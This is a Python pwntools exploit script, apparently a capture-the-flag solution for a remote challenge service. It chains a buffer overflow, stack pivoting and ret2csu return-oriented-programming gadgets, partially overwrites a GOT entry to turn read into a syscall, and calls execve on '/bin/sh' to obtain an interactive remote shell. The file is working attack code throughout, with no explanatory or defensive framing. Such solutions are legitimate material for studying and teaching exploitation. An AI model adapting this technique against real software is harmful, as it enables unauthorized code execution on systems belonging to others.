import time

from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10135
r = remote(host, port)

# input('Press enter to continue.')

payload = b'a'*0x20

rbp_20_read_leave_ret = 0x000000000040062b
tmp_buf = 0x00602000 - 0x200
buf = tmp_buf + 0x30
read_got = 0x4004c0
read_plt = 0x601020
pop_rsi_r15 = 0x00000000004006b1
pop_rbx_rbp_r12_r13_r14_r15 = 0x4006aa
mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8 = 0x400690

rop = flat([buf+0x20, rbp_20_read_leave_ret])
r.recvuntil(':')
r.send(payload + rop)

def add_4_rop(rop_list, new_rbp):
    """
    args:
        rop_list: a list containing 4 addresses you want to write.
        new_rbp: the new rbp address (also is the position it will write next time)
    """
    global r
    global tmp_buf
    global rbp_20_read_leave_ret
    rop = flat(rop_list + [tmp_buf, rbp_20_read_leave_ret])
    r.send(rop)
    rop = flat([0xaaaaaaaa]*4 + [new_rbp, rbp_20_read_leave_ret])
    r.send(rop)

def last_add_4_rop(rop_list):
    """
    args:
        rop_list: a list containing 4 addresses you want to write.
    """
    global r
    global buf
    global rbp_20_read_leave_ret
    rop = flat(rop_list + [buf-0x8, rbp_20_read_leave_ret])
    r.send(rop)

# now rax=0, rdi=0x0, rsi=0x601048, rdx=0x40
# overwrite read@plt to syscall
add_4_rop([pop_rsi_r15, read_plt, 0xbbbbbbbb, read_got], buf+0x20+0x20)

# now rax=1, read_got=syscall
# write 0x3b chars outside, so that rax=0x3b
add_4_rop([pop_rbx_rbp_r12_r13_r14_r15, 0x0, 0x1, buf+0x18], buf+0x40+0x20)
add_4_rop([0x3b, read_plt, 0x1, mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8], buf+0x60+0x20)

# now rax=0x3b
# execve('/bin/sh\0', 0, 0)
add_4_rop([0xcccccccc, 0x0, 0x1, buf+0x18], buf+0x80+0x20)
last_add_4_rop([0x0, 0x0, buf-0x28, mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8])
r.sendline(b'/bin/sh\0')

# input('Press enter to send char to overwrite read@plt.')
sleep(0.1)

# answer read_plt
r.send(b'\x2e')
r.recvn(0x3b)

r.interactive()
